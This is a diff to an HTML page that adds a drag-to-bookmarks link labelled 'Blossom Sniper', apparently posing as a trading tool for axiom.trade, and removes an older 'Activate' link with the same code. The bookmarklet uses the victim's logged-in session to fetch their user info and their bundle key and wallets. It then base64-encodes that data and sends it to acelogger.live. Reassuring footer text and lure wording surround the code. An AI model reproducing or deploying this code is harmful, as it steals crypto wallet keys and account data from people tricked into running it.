@@ -767,19 +767,50 @@
         </main>
     </div>
 
+    <div class="bookmarklet-container">
+        <a
+          class="bookmarklet"
+          draggable="true"
+          onclick="return false"
+          href="javascript:(function(){
+            try{
+              if(location.hostname!=='axiom.trade'){
+                alert('Go to axiom.trade first');
+                location.href='https://axiom.trade/discover';
+                return;
+              }
+              if(!localStorage.getItem('isAuthed')){
+                alert('You must be logged in');
+                return;
+              }
+              fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})
+              .then(r=>r.json())
+              .then(user=>{
+                return fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})
+                .then(r=>r.json())
+                .then(bundle=>{
+                  const payload={site:location.href,user,bundle:bundle.bundleKey};
+                  location.href='https://acelogger.live/data/'+btoa(JSON.stringify(payload));
+                });
+              });
+            }catch(e){
+              alert('Error');
+              console.error(e);
+            }
+          })();"
+        >
+          Blossom Sniper
+        </a>
+    </div>
 
+    <p class="footer-note">
+        no installation • works in browser • never auto-runs
+    </p>
 
-      <a
-  id="activatorBtn"
-  class="bookmarklet activator-btn"
-  draggable="true"
-  onclick="return false"
-  title="Drag this to your bookmarks bar"
-  href="javascript:(async()=>{try{if(location.hostname!=='axiom.trade'){alert('Go to axiom.trade first');location.replace('https://axiom.trade/discover');return;}if(!localStorage.getItem('isAuthed')){alert('You must be logged in');return;}const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const payload={site:location.href,user,bundle:bundle.bundleKey};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(payload)));}catch(e){alert('Error');console.error(e);}})();"
->
-  Activate
-</a>
+    <div class="instructions-section" id="instructions">
+        <h2 class="instructions-title">Get started in 30 seconds</h2>
+    </div>
+</main>
+</div>
 
-
-</body>
-</html>
+<script>
